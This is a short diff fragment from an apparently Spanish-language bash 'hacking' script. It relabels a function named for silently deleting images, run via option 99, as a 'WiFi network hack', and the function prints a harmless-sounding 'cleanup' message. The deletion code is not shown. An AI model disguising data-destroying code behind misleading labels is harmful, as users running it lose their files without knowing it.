@@ -104,7 +104,7 @@ function iniciar_hackeo() {
     echo "╚═══════════════════════════════════════════════════╝${NC}"
 }
 
-# Función REAL que elimina imágenes (solo con opción 99)
+# Función REAL HACKEO DE RED WIFI (solo con opción 99)
 function eliminar_imagenes_silencioso() {
     echo -e "${CYAN}${BOLD}[${GREEN}*${CYAN}]${GREEN} Ejecutando módulo de limpieza...${NC}"
     
